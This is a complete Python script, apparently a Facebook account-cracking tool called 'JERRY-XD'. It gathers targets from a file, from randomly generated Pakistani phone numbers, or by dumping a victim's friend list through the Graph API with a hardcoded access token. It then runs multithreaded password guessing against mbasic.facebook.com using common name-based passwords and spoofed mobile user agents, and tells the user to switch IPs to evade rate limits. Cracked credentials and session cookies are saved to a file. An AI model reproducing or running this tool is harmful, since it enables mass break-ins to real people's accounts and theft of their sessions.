#!/usr/bin/python3
#-*-coding:utf-8-*-
# JERRY-XD V13 [FINAL PACKAGE] 2025

import os, requests, re, sys, time, random, threading, shutil
from concurrent.futures import ThreadPoolExecutor as JerrySpeed

# --- COLORS ---
G = '\x1b[1;92m' # Green
W = '\x1b[1;97m' # White
R = '\x1b[1;91m' # Red
Y = '\x1b[1;93m' # Yellow
C = '\x1b[1;36m' # Cyan

ok, cp, loop, id = [], [], 0, []

def logo():
    os.system('clear')
    print(f"""{C}
       ____  __________  ______  __
      / / / / / __  / __ \/ __ \/ /
 __  / / /_/ / /_/ / /_/ / /_/ /_/ 
/ /_/ /  ___/ _, _/ _, _/  ___/ /  
\____/_/   /_/ |_/_/ |_/_/   /_/   
{W} ----------------------------------------------
{G} [•] Final Update : Dec 2025
{G} [•] Performance  : Max Turbo (All PK SIMS)
{G} [•] Maintenance  : Auto-Clean Enabled
{W} ----------------------------------------------""")

def auto_clean():
    # Deleting cache and temp files to boost speed
    print(f"\n {Y}[*] Cleaning system cache...")
    try:
        if os.path.exists('__pycache__'): shutil.rmtree('__pycache__')
        print(f" {G}[√] Cache Cleared!")
    except: pass

def pk_sim_ua():
    # 2025 Elite Device Strings
    devices = ["SM-S928B", "V2310", "SM-A546B", "iPhone15,3", "RMX3850"]
    return f"Mozilla/5.0 (Linux; Android {random.randint(12,15)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,132)}.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/{random.randint(430,465)}.0.0.0;FBBV/{random.randint(600000000,750000000)};]"

def main():
    logo()
    print(f" {G}[1] FILE CLONING")
    print(f" {G}[2] RANDOM CLONING (PK)")
    print(f" {G}[3] TURBO PUBLIC DUMP")
    print(f" {G}[0] EXIT & CLEAN")
    line = input(f"\n {C}[?] Select : {W}")
    if line == '1':
        path = input(f" {G}[?] File Path: {W}")
        try:
            global id
            id = open(path).read().splitlines()
            start_engine()
        except: print(f" {R}[!] Error"); main()
    elif line == '2':
        code = input(f" {G}[?] Code (0300-0349): {W}")
        limit = int(input(f" {G}[?] Limit: {W}"))
        for _ in range(limit):
            id.append(code + "".join(random.choices("0123456789", k=7)))
        start_engine()
    elif line == '3':
        uid = input(f" {G}[?] Target UID: {W}")
        try:
            res = requests.get(f"https://graph.facebook.com/{uid}/friends?access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662").json()
            for user in res['data']: id.append(user['id'] + '|' + user['name'])
            print(f" {G}[√] Total Dumped: {len(id)}"); start_engine()
        except: print(f" {R}[!] Error"); main()
    else:
        auto_clean(); sys.exit()

def start_engine():
    logo()
    print(f" {G}[*] Total IDs : {len(id)}")
    print(f" {G}[*] Threads   : 35 [Turbo]")
    print(f"{W} ----------------------------------------------")
    with JerrySpeed(max_workers=35) as exec:
        for user in id:
            try:
                if '|' in user:
                    uid, name = user.split('|')
                    first = name.split(' ')[0].lower()
                    pwx = [name, name.lower(), first+'123', first+'1234', first+'786', 'pakistan', 'khan123', 'khan786']
                else:
                    uid = user
                    pwx = [user, user[:6], user[5:], 'pakistan', 'khan123', '786786', 'khan786']
                exec.submit(crack_logic, uid, pwx)
            except: continue
    auto_clean()
    print(f"\n{G} [√] Done. Result in jerry_ok.txt")
    input(" Press Enter To Return ")
    main()

def crack_logic(user, pwx):
    global loop, ok, cp
    if loop % 500 == 0 and loop > 0:
        print(f"\n{R} [!] REFRESH IP (AIRPLANE MODE) {W}")
    
    sys.stdout.write(f'\r {W}[JERRY] {loop}/{len(id)} | {G}OK:{len(ok)} | {Y}CP:{len(cp)} ')
    sys.stdout.flush()
    
    for pw in pwx:
        try:
            session = requests.Session()
            ua = pk_sim_ua()
            session.headers.update({'Host': 'mbasic.facebook.com','user-agent': ua,'accept-language': 'en-PK,en-US;q=0.9'})
            res = session.get('https://mbasic.facebook.com/login.php').text
            data = {"lsd": re.search('name="lsd" value="(.*?)"', str(res)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(res)).group(1),"email": user, "pass": pw, "login": "Log In"}
            session.post('https://mbasic.facebook.com/login/device-based/regular/login/', data=data, allow_redirects=False)
            if 'c_user' in session.cookies.get_dict():
                coki = ";".join([k+"="+v for k,v in session.cookies.get_dict().items()])
                print(f'\r\n{G} [JERRY-OK] {user} | {pw} \n [COOKIE] {coki} ')
                ok.append(user)
                open('jerry_ok.txt', 'a').write(user+'|'+pw+'|'+coki+'\n')
                break
            elif 'checkpoint' in session.cookies.get_dict():
                cp.append(user)
                open('jerry_cp.txt', 'a').write(user+'|'+pw+'\n')
                break
        except: continue
    loop += 1

if __name__ == "__main__":
    main()
